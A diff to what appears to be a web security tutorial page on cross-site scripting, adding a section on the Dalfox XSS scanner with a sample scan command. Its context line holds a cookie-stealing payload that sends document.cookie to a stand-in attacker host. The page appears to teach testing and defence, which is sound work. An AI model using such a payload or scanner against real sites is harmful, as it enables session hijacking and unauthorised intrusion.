@@ -52,6 +52,23 @@ fetch('https://attacker.example/steal?c=' + document.cookie)
         proof-of-concept.
       </p>
 
+      <h2>Automating discovery: Dalfox</h2>
+      <p>
+        Manually crafting a payload for one parameter at a time doesn't scale to a target with hundreds of
+        parameters across dozens of pages. <strong>Dalfox</strong> is a dedicated XSS scanning tool built to
+        close that gap — it automates parameter discovery, fires a large library of context-aware payloads
+        at each one, and then verifies execution (rather than just guessing from a reflected string) using a
+        headless browser.
+      </p>
+      <CodeBlock label="scanning a single URL with Dalfox">{`dalfox url https://target.com/search?q=FUZZ
+# discovers reflected parameters, tries encoding/context-aware payload variants for each,
+# and reports only the ones it actually confirmed execute — cutting down false positives`}</CodeBlock>
+      <p>
+        The same instinct from the detection test above — does the payload come back encoded or raw — is
+        exactly what Dalfox automates at scale, plus the extra step of confirming real execution so you're
+        not chasing false positives across a large target.
+      </p>
+
       <h2>Session attacks: cookies and tokens</h2>
       <CodeBlock label="what to check on every session cookie">{`Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
 
